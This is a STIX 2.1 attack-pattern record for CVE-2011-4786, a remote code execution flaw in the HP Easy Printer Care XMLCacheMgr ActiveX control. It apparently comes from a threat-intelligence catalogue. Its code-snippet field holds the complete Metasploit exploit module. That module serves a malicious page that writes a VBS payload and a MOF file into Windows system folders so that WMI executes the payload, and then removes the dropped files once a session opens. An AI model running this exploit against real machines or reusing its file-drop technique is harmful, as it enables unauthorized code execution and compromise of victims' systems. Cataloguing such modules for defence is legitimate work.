{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--31ce8183-8e7a-4ab2-b96c-7d0c102ae8dc",
    "created": "2024-08-14T16:40:57.668254Z",
    "modified": "2024-08-14T16:40:57.668258Z",
    "name": "HP Easy Printer Care XMLCacheMgr Class ActiveX Control Remote Code Execution",
    "description": " This module allows remote attackers to place arbitrary files on a users file system by abusing the \"CacheDocumentXMLWithId\" method from the \"XMLCacheMgr\" class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll 2.7.2.0).  Code execution can be achieved by first uploading the payload to the remote machine embeddeding a vbs file, and then upload another mof file, which enables Windows Management Instrumentation service to execute the vbs. Please note that this module currently only works for Windows before Vista.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_easy_printer_care_xmlcachemgr.rb",
            "external_id": "hp_easy_printer_care_xmlcachemgr.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4786"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP Easy Printer Care XMLCacheMgr Class ActiveX Control Remote Code Execution',\n        'Description' => %q{\n          This module allows remote attackers to place arbitrary files on a users file\n          system by abusing the \"CacheDocumentXMLWithId\" method from the \"XMLCacheMgr\"\n          class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll\n          2.7.2.0).\n\n          Code execution can be achieved by first uploading the payload to the remote\n          machine embeddeding a vbs file, and then upload another mof file, which enables\n          Windows Management Instrumentation service to execute the vbs. Please note that\n          this module currently only works for Windows before Vista.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Andrea Micalizzi', # aka rgod original discovery\n          'juan vazquez', # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2011-4786' ],\n          [ 'OSVDB', '78306' ],\n          [ 'BID', '51396' ],\n          [ 'ZDI', '12-013' ],\n        ],\n        'DefaultOptions' => {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500,\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          # Windows before Vista\n          [ 'Automatic', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2012-01-11',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # The following handles deleting the copied vbs payload and mof file\n  # See \"struts_code_exec.rb\" and \"ms10_026_dbldecode.rb\" for more information.\n  #\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The vbs payload and mof file must be removed manually.\")\n      return\n    end\n\n    return if not @var_mof_name\n    return if not @var_vbs_name\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    cmd = \"C:\\\\windows\\\\system32\\\\attrib.exe -r \" +\n          \"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\"\n\n    client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n    begin\n      print_warning(\"Deleting the vbs payload \\\"#{@var_vbs_name}.vbs\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\\" + @var_vbs_name + \".vbs\")\n      print_warning(\"Deleting the mof file \\\"#{@var_mof_name}.mof\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\")\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def on_request_uri(cli, request)\n    unless request['User-Agent'] =~ /MSIE/\n      print_error(\"Sending 404 for unknown user-agent\")\n      send_not_found(cli)\n      return\n    end\n\n    # Using Windows Management Instrumentation service to execute the payload.\n    # Using code from \"blackice_downloadimagefileurl.rb\". See it for more information.\n\n    var_xmlcachemgr = rand_text_alpha(rand(5) + 5)\n    var_mof_function_name = rand_text_alpha(rand(5) + 5)\n\n    content = <<-EOS\n    <html>\n    <head>\n    <script>\n      var #{var_xmlcachemgr} = new ActiveXObject('HPESPRIT.XMLCacheMgr.1');\n\n      function #{var_mof_function_name}() {\n        #{var_xmlcachemgr}.CacheDocumentXMLWithId(\n          \"c:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\wbem\\\\\\\\mof\\\\\\\\#{@var_mof_name}.mof\",\n          unescape(\"#{@mof_content}\"),\n          1,\n          1\n        );\n      }\n\n      #{var_xmlcachemgr}.CacheDocumentXMLWithId(\n        \"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\#{@var_vbs_name}.vbs\",\n        unescape(\"#{@vbs_content}\"),\n        1,\n        1\n      );\n\n      setTimeout(\"#{var_mof_function_name}()\", 4000);\n    </script>\n    </head>\n    </html>\n    EOS\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, content)\n    handler(cli)\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @var_mof_name = rand_text_alpha(rand(5) + 5)\n    @var_vbs_name = rand_text_alpha(rand(5) + 5)\n\n    print_status(\"Encoding payload into vbs...\")\n    payload = generate_payload_exe\n    @vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))\n\n    print_status(\"Generating mof file...\")\n    @mof_content = Rex::Text.to_hex(generate_mof(\"#{@var_mof_name}.mof\", \"#{@var_vbs_name}.vbs\"))\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-11",
    "x_mitre_platforms": [
        "win'"
    ]
}